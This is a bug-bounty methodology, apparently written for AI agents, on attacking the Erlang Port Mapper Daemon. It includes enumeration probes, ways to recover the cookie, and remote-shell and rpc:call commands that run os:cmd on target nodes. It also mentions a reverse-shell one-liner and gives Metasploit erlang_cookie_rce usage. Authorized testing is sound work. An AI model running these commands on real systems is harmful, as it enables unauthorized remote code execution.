---
technology: "Erlang Port Mapper Daemon (EPMD)"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
version: "1.1"
last-refresh: "2026-11-19"
source: "rewritten from HackTricks (src/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.md), CC BY-NC 4.0, accessed 2026-11-13; v1.1 supplement: AI senior-reviewer pass (GPT-6.1 Sol via M365 Copilot) + dual fact-check (agent-side direct fetches of erlang.org erl/erl_dist_protocol man pages and reviewer-side web verification)"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference and primary sources. Verified 2026-11-13 against: Erlang/OTP erl_dist_protocol spec (2-byte length prefix on every EPMD request; NAMES=110/'n', DUMP=100/'d', KILL=107/'k', PORT2=122/'z', ALIVE2=120; names reply 4-byte port + 'name ~ts at port ~p' lines; MD5(cookie+challenge) handshake; net_kernel drops invalid cookies after ~1s; OTP 23+ protocol v6, OTP 25 drops v5; TLS distribution optional); insinuator blog (default cookie random [A-Z] 20 chars at ~/.erlang.cookie; no brute-force protection; epmd_bf); metasploit-framework exploit/multi/misc/erlang_cookie_rce source read directly (option COOKIE, default RPORT 25672 — a distribution port, NOT 4369; module forges send_name + challenge_reply and delivers a rex `call os cmd` tuple). Companion overview: [[epmd|EPMD]]. v1.1 supplement 2026-11-19 (model gpt-6.1-sol via M365 Copilot senior-review pass; claims dual-verified against live erlang.org man pages and RabbitMQ docs): -cookie→-setcookie correction (erl manual: obsolete, no effect — publication-blocking), NAMES-vs-PORT2 version semantics, alive-name lookup key, EPMD KILL/STOP real semantics (local management ops, -relaxed_command_check, remote clients limited to queries), pang ≠ wrong-cookie, cookie search paths (home then user-config dir; product-specific), default-cookie 'not very unpredictable' reframing, metasploit v5-handshake incompatibility with OTP 25+ peers, local privesc permission prerequisites, junior-pitfall table."
---

# EPMD bug bounty methodology

Target model: TCP/4369 EPMD (enumeration, no auth) is a **discovery service, not a proxy** — it hands out distribution ports; the client then opens a separate direct connection to that port. End state is a remote shell on the BEAM node (`os:cmd`) with the service account's OS privileges. Cookie auth is one gate among several: network filtering, TLS peer auth, naming restrictions, and protocol compatibility can each stop you independently. An invalid cookie disconnects after ~1s (documented), but that timing is not a universal oracle — classify failures by layer, not by elapsed time.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| EPMD NAMES request | 4369 reachable | yes | node names + distribution ports — Info, targeting map (versions need PORT2, below) |
| PORT2 request (alive name) | 4369 reachable | yes | per-node distribution version bounds (Highest/Lowest) — client-compatibility gate |
| Cookie + distribution port | leaked cookie file or weak operator cookie | credential-gated | `-remsh` shell / `rpc:call` → RCE as the service account — Critical when demonstrated |
| Weak cookie brute force | short operator-set cookie | yes (no failure counting) | cookie recovery → RCE — Critical when demonstrated |
| EPMD KILL / STOP | daemon started with `-relaxed_command_check` | management, not remote-by-default | KILL = local management op, normally refused while nodes are registered; STOP forcibly unregisters one node. Out of test scope either way |

EPMD reachability proves nothing about distribution-port reachability (and blocking EPMD alone does not protect a *known* distribution endpoint) — check both separately.

## Phase 1 — enumerate nodes

```bash
# NAMES request: 2-byte length (0x0001) + request byte 'n' (110) — reply leads with 4-byte EPMD port,
# then textual 'name at port' entries. NO protocol versions in this reply.
printf '\x00\x01\x6e' | nc -v TARGET_IP 4369
```

```bash
# PORT2 (request byte 'z', 122) on the ALIVE NAME (the part before @ — EPMD tracks only that,
# so query 'rabbit', not 'rabbit@host'): reply carries the distribution port + Highest/Lowest version
python3 -c "
import socket
s = socket.create_connection(('TARGET_IP', 4369))
n = b'rabbit'                                  # alive name only
s.sendall(len(n + b'z').to_bytes(2, 'big') + b'z' + n)
print(s.recv(4096))"
```

```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info TARGET_IP
```

- nmap output shape: `epmd_port: 4369` plus a `nodes:` list (`name at port` per node). Record every distribution port — that is where phases 2–3 happen. The registered name is the alive name; the full `name@host` identity (and its real hostname) comes from the handshake, not from appending your DNS alias.
- With Erlang/OTP installed locally: `erl` then `net_adm:names('TARGET_HOST').` returns the same map.
- DUMP request (byte `100`) is the debug firehose variant; skip it — NAMES is quieter.
- Internet-wide recon: `port:4369 "at port"` on search engines.

## Phase 2 — acquire the cookie

- File: `.erlang.cookie` of the account running the node. OTP looks in the home directory first, then the Erlang user-configuration directory (`filename:basedir(user_config, "erlang")`); products add their own locations (RabbitMQ is product- and OS-specific — record the packaging, don't assume `~/.erlang.cookie` is exhaustive). Cookie files are created owner-only (0400) — reading one requires an actual permission failure or disclosure primitive, not just "a shell on the box".
- Deployment artifacts: container images and orchestrator configs setting the cookie env var, CI variables, configuration-management repos — where a *weakly generated* or over-shared secret lives. Note: a shared cluster-wide cookie is by design (RabbitMQ requires it) — the defect is exposure, weak generation, or reuse across trust boundaries, not the sharing itself.
- Else: short operator-chosen cookies are the realistic brute target; the daemon does no failure counting. The published brute-forcer (epmd_bf, insinuator research) needs the target's distribution port and IP edited into its source. The default is a 20-char [A-Z] cookie — OTP's own docs call it "not very unpredictable" and recommend crypto-generated replacements, but for brute purposes treat the *default* as out of reach and say so in the report rather than promising a crack.

## Phase 3 — verify and execute (remote)

**Use `-setcookie`** — `erl -cookie` is an obsolete no-effect misspelling (current erl manual: "Obsolete flag without any effect... Use -setcookie instead"). With the wrong flag your client silently uses its own cookie file and every result is garbage.

```bash
# Verify: pong = working authenticated distribution connection. pang = connection FAILURE
# (DNS, naming-mode mismatch, blocked distribution port, TLS requirement, protocol incompatibility,
#  or wrong cookie) — determine the failing layer before blaming the cookie.
erl -setcookie LEAKED_COOKIE -name probe@ATTACKER_HOST
1> net_adm:ping('rabbit@TARGET_HOST').
```

```bash
# Remote shell onto the target node (a new remote shell, not an attach to an operator's session)
erl -setcookie LEAKED_COOKIE -name probe@ATTACKER_HOST -remsh rabbit@TARGET_HOST
(rabbit@TARGET_HOST)1> node().      % confirm WHERE expressions evaluate before anything consequential
(rabbit@TARGET_HOST)2> os:cmd("id").
```

- For single commands from your node: `rpc:call('rabbit@TARGET_HOST', os, cmd, ["id"]).`
- Reverse shell via `rpc:call` with a `python -c 'import socket,subprocess,os;...'` one-liner when you need an OS shell rather than an Erlang one.

## Phase 4 — local privilege escalation variant

Already on the box as another user? The pivot needs a real disclosure first — the cookie file is owner-only, so "another shell" ≠ "cookie access": find the mispermission, the world-readable backup, or the deployment artifact that leaks it.

```bash
erl -sname probe -setcookie LEAKED_COOKIE
1> rpc:call('couchdb@localhost', os, cmd, ["whoami"]).
```

(`HOME=/` only changes *your client's* lookup context so a root shell finds `/.erlang.cookie` — it does not bypass file permissions, and with `-setcookie` supplied it is unnecessary.) Classify the result honestly: executing as the service account is service-context compromise; it is "escalation" only relative to your starting principal, and root → service-account is a *de*-escalation. CouchDB note: ≤3.2.1 ran the default-cookie node (CVE-2022-24706); from 3.2.2 the broker refuses the old default cookie ("monster") and binary packages bind EPMD + distribution to loopback — a packaging default, so verify actual bindings; the local cookie-disclosure path survives loopback.

## Phase 5 — Metasploit

```text
use exploit/multi/misc/erlang_cookie_rce
set COOKIE LEAKED_COOKIE
set RHOST TARGET_IP
set RPORT 25672        # the DISTRIBUTION port from epmd-info — NOT 4369
run
```

Verified from the module source: it forges the `send_name`/challenge-reply handshake itself, then delivers a `rex` tuple invoking `os:cmd` — Unix and Windows targets, command-stager support. Default RPORT 25672 is RabbitMQ's distribution-port convention; set it to whatever `epmd-info` reported. **Compatibility gate:** the inspected module builds the old version-5 handshake without the modern capability flags — OTP 25+ peers (protocol v6, `DFLAG_HANDSHAKE_23` mandatory) refuse it. Against modern targets use a compatible local OTP as the client instead; a newer local install cannot fix a module that speaks the handshake itself.

## Decision points

- 4369 open, no nodes listed → distribution disabled or epmd idle; check for clustered services another way.
- `pang`/disconnect on ping → connection failed somewhere: name resolution, naming mode (`-name` vs `-sname`), blocked distribution port, TLS, protocol version, or cookie. Work the layers; try every cookie recovered from the estate before brute force.
- Modern OTP peer refuses your client → protocol-version gate: OTP 25 dropped v5 handshakes (pre-OTP-23 peers can't pair). Use a compatible, supported client and record both client and target versions.
- Scope note: EPMD KILL (`\x6b`) and STOP are destructive management operations (both gated by `-relaxed_command_check` on the daemon side) and wrong-cookie floods are pure availability impact — enumerate and authenticate instead.

## Junior-tester pitfalls (top failure modes)

| Likely mistake | Consequence |
| --- | --- |
| `erl -cookie C` (no-effect flag) | Client silently uses its own cookie — bogus pongs/pangs, "exploit broken" reports |
| `pang` read as "wrong cookie" | DNS/port/TLS/protocol layer never checked; false negative |
| PORT2 sent `rabbit@host` instead of alive name `rabbit` | Empty/ERROR reply; node "not found" |
| Versions expected from NAMES | Wrong client-version planning; versions live in the PORT2 reply |
| EPMD blocked read as "distribution safe" | Known distribution port still directly reachable |
| Cookie file assumed readable from any shell | Owner-only perms overlooked; no disclosure primitive demonstrated |
| `HOME=/` treated as a permission bypass | It only changes the client's lookup path |
| Metasploit module fired at OTP 25+ peers | v5 handshake refused; target misclassified as patched |
| Shared cluster cookie called a misconfiguration | RabbitMQ requires it — the finding must be exposure/weakness/reuse |

## Tool mapping (named in prose)

nmap with the epmd-info NSE script for enumeration; plain nc for the raw two-byte EPMD requests; a local Erlang/OTP install (`erl`) as the exploit client for `net_adm:names/1`, `net_adm:ping/1`, `-remsh`, and `rpc:call/4`; the epmd_bf cookie brute-forcer from the insinuator research; Metasploit's erlang_cookie_rce module for framework-integrated delivery (pre-OTP-25 peers).

## References (v1.1 verification trail)

- erlang.org man pages: `erl` (-cookie obsolete; -setcookie; cookie creation mode; search order home → user-config dir), `epmd` (alive-name tracking, KILL/STOP restrictions, -relaxed_command_check), `net_adm` (pong/pang semantics).
- erlang.org erl_dist_protocol (request bytes, NAMES reply shape, PORT2 Highest/Lowest versions, invalid-cookie ~1s disconnect, OTP 25 / protocol v6 / DFLAG_HANDSHAKE_23).
- rabbitmq.com docs (cookie semantics: shared by design, product-specific locations, owner-only files).
- docs.couchdb.org CVE-2022-24706 advisory (3.2.2 refuses default cookie; binary packages bind EPMD/distribution to loopback).
- metasploit-framework erlang_cookie_rce module source (v5 handshake construction, rex os:cmd tuple, default RPORT 25672).
